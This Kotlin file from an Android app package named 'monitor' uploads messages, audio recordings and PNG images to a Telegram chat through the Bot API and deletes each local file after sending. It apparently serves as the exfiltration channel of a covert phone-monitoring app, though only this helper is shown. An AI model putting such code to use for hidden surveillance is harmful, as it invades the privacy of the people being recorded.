package com.dec.monitor

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File

object TelegramBot {

    private val client = OkHttpClient()
    private val base = "https://api.telegram.org/bot${Config.BOT_TOKEN}"

    suspend fun sendMessage(text: String) = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().apply {
                put("chat_id", Config.CHAT_ID)
                put("text", text)
                put("parse_mode", "HTML")
            }.toString().toRequestBody("application/json".toMediaType())

            val req = Request.Builder().url("$base/sendMessage").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            Log.e("TelegramBot", "sendMessage failed: ${e.message}")
        }
    }

    suspend fun sendAudio(file: File, caption: String) = withContext(Dispatchers.IO) {
        try {
            val reqBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("audio", file.name,
                    file.asRequestBody("audio/mpeg".toMediaType()))
                .build()

            val req = Request.Builder().url("$base/sendAudio").post(reqBody).build()
            client.newCall(req).execute().close()
            file.delete()
        } catch (e: Exception) {
            Log.e("TelegramBot", "sendAudio failed: ${e.message}")
        }
    }

    suspend fun sendPhoto(file: File, caption: String) = withContext(Dispatchers.IO) {
        try {
            val reqBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", file.name,
                    file.asRequestBody("image/png".toMediaType()))
                .build()

            val req = Request.Builder().url("$base/sendPhoto").post(reqBody).build()
            client.newCall(req).execute().close()
            file.delete()
        } catch (e: Exception) {
            Log.e("TelegramBot", "sendPhoto failed: ${e.message}")
        }
    }
}
